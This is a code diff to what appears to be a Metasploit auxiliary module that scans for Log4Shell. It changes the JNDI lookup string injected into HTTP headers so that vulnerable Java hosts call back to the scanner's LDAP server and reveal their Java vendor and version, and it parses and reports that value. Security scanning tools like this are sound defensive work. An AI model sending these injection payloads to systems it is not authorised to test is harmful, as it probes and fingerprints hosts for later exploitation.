@@ -38,10 +38,12 @@ class MetasploitModule < Msf::Auxiliary
 
     client.write(['300c02010161070a010004000400'].pack('H*'))
     pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    token = pdu.search_parameters[:base_object].to_s
+    base_object = pdu.search_parameters[:base_object].to_s
+    token, java_version = base_object.split('/', 2)
 
-    unless (context = @tokens[token]).nil?
+    unless (context = @tokens.delete(token)).nil?
       details = "#{context[:method]} #{normalize_uri(context[:target_uri])} (header: #{context[:header]})"
+      details << " (java: #{java_version})" unless java_version.blank?
       print_good('Log4Shell found via ' + details)
       report_vuln(
         host: context[:rhost],
@@ -95,7 +97,8 @@ class MetasploitModule < Msf::Auxiliary
       send_request_raw({
         'uri' => normalize_uri(target_uri),
         'method' => method,
-        'headers' => { header => jndi_string(token) }
+        # https://twitter.com/404death/status/1470243045752721408
+        'headers' => { header => jndi_string("#{token}/${sys:java.vendor}_${sys:java.version}") }
       })
     end
   end
